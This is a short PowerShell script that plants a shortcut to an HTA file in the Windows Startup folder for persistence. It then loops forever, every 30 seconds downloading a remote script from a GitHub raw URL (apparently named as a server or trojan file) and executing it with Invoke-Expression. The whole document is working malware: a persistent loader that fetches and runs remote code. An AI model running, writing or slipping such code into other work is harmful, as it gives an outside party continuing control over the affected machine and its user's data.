
# Create shortcut to HTA file in Startup folder
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.lnk")
$Shortcut.TargetPath = "$env:USERPROFILE\code1.hta"
$Shortcut.Save()

# Loop to run PowerShell script every 30 seconds
while ($true) {
    Start-Sleep -Seconds 30
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
}
